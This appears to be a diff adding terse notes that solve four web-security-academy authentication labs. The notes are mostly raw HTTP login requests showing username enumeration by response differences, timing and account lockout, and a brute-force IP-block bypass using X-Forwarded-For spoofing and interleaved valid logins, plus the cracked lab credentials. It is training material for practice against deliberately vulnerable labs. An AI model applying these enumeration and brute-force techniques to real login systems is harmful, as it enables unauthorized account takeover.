@@ -1,0 +1,222 @@
+1) Lab: Username enumeration via subtly different responses
+ 
+Using intruder - Sniper attack - see on "Invalid username or password" or "Invalid username or password."
+ 
+---
+ 
+POST /login HTTP/2
+Host: 0aa100d904e0cf20803ec6bd001100ad.web-security-academy.net
+Cookie: session=YqbcyfzMZQUOpDYVsP8qUbvgaCYmxnTl
+Content-Length: 30
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0aa100d904e0cf20803ec6bd001100ad.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0aa100d904e0cf20803ec6bd001100ad.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+ 
+username=aix&password=Password
+ 
+---
+ 
+POST /login HTTP/2
+Host: 0aa100d904e0cf20803ec6bd001100ad.web-security-academy.net
+Cookie: session=YqbcyfzMZQUOpDYVsP8qUbvgaCYmxnTl
+Content-Length: 32
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0aa100d904e0cf20803ec6bd001100ad.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0aa100d904e0cf20803ec6bd001100ad.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+ 
+username=aix&password=1234567890
+ 
+2) Lab: Username enumeration via response timing
+ 
+See on response time
+ 
+Use intruder pitchfork attack for IP and Username
+ 
+Header - X-Forwarded-For
+ 
+---
+ 
+POST /login HTTP/2
+Host: 0a97002203a6e2b9831c1414003c0046.web-security-academy.net
+Content-Length: 2892
+X-Forwarded-For: 1.1.1.18
+Connection: keep-alive
+ 
+username=azureuser&password=PasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPasswordPassword
+ 
+---
+ 
+POST /login HTTP/2
+Host: 0a97002203a6e2b9831c1414003c0046.web-security-academy.net
+Content-Length: 32
+X-Forwarded-For: 1.1.2.1
+ 
+username=azureuser&password=Password
+ 
+---
+ 
+POST /login HTTP/2
+Host: 0a97002203a6e2b9831c1414003c0046.web-security-academy.net
+Content-Length: 36
+X-Forwarded-For: 1.1.2.66
+Connection: keep-alive
+ 
+username=azureuser&password=11111111
+ 
+---
+ 
+azureuser
+11111111
+
+3) Lab: Broken brute-force protection, IP block
+ 
+POST /login HTTP/2
+Host: 0aa200cf03f0d0a980980d4a00580071.web-security-academy.net
+Cookie: session=QEA2v917g2qUw2q2DLCd7tWHBqBkldBd
+Content-Length: 30
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0aa200cf03f0d0a980980d4a00580071.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0aa200cf03f0d0a980980d4a00580071.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+ 
+username=wiener&password=peter
+ 
+---
+ 
+wiener
+carlos
+wiener
+carlos
+wiener
+carlos
+wiener
+carlos
+wiener
+carlos
+ 
+---
+ 
+peter
+123456
+peter
+password
+peter
+12345678
+peter
+qwerty
+peter
+123456789
+ 
+---
+ 
+carlos
+qwerty
+ 
+4) Lab: Username enumeration via account lock
+ 
+Cluster bomb - Numbers + Username
+ 
+---
+ 
+POST /login HTTP/2
+Host: 0ade00440424368c83276e6d005a005d.web-security-academy.net
+Cookie: session=l4gtYWNLkNk5BzheayeAe3awo4pYgt2f
+Content-Length: 34
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0ade00440424368c83276e6d005a005d.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ade00440424368c83276e6d005a005d.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+ 
+password=test3&username=activestat
+ 
+---
+ 
+activestat
+ 
+---
+ 
+POST /login HTTP/2
+Host: 0ade00440424368c83276e6d005a005d.web-security-academy.net
+Cookie: session=l4gtYWNLkNk5BzheayeAe3awo4pYgt2f
+Content-Length: 35
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: ru-RU,ru;q=0.9
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Origin: https://0ade00440424368c83276e6d005a005d.web-security-academy.net
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0ade00440424368c83276e6d005a005d.web-security-academy.net/login
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+ 
+password=pepper&username=activestat
+ 
+---
+ 
+pepper
